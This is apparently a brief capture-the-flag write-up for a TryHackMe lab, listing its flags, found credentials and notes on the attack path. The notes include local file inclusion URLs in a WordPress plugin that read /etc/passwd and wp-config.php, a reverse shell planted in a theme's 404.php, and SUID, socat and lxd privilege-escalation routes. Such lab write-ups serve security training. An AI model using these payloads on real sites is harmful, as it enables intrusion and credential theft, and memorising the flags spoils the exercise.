# TryHackMe All in One

>Saikat Karmakar | Feb 27:2021

-------------------------------------------------------------------------------

# Task 1
1. user.txt
```
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```
2. Root.txt
```
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

--
-----------
***Notes***
-----------
possible wp-login creds
```
user = elyana
pass = H@ckme@123
```

log=elyana&pwd=abcd&wp-submit=Log In&redirect_to=http://10.10.13.236/wordpress/wp-admin/&testcookie=1

CVE :(https://www.exploit-db.com/exploits/40290)

http://10.10.13.236/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd


**get the config file**
http://10.10.13.236/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

revshell location(uploaded in 404.php)
http://10.10.13.236/wordpress/wp-content/themes/twentytwenty/404.php

find /  -type f -user elyana 2>/dev/null

cat /etc/mysql/conf.d/private.txt

user creds of the box 
```
user: elyana
password: E@syR18ght
```
sudo ways

1. sudo -l -> GTFOBins socat 
2. suid -> /bin/bash(/bin/bash -p),
	/bin/chmod(This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.)

3. lxd 
```
https://github.com/saghul/lxd-alpine-builder
```
